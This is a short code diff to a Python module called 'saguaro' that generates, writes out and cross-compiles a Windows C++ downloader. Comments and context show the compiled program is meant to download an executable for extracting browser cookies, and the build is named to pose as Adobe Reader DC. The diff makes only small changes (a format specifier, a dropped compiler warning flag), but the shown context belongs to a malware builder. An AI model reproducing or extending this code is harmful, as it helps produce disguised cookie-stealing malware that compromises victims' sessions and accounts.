@@ -98,7 +98,7 @@ class saguaro(Module):
 			    } else if(res == INET_E_DOWNLOAD_FAILURE) {
 			        printf(" URL is invalid\\n");
 			    } else {
-			        printf("Other error: %%d\\n", res);
+			        printf("Other error: %%ld\\n", res);
 			    }
 			//DESCARGA EXE PARA EXTRAER COOKIES
 			file_name = EXEFILE1;
@@ -130,7 +130,7 @@ class saguaro(Module):
 		f.write(DWL_FILES)
 		print("Archivo "+ fullname + " creado.")
 		#i686-w64-mingw32-g++ evil.cpp -o adobereaderDC-202001320074 -lwininet -lurlmon -static-libgcc -static-libstdc++ -Wall
-		args = ["i686-w64-mingw32-g++", fullname, "-o", outfile, "-lwininet","-lurlmon","-Wall","-static-libgcc", "-static-libstdc++"]
+		args = ["i686-w64-mingw32-g++", fullname, "-o", outfile, "-lwininet","-lurlmon","-static-libgcc", "-static-libstdc++"]
 		print("{} {}".format(fullname, outfile))
 		subprocess.Popen(args)
 		print("Compilado {}".format(outfile))
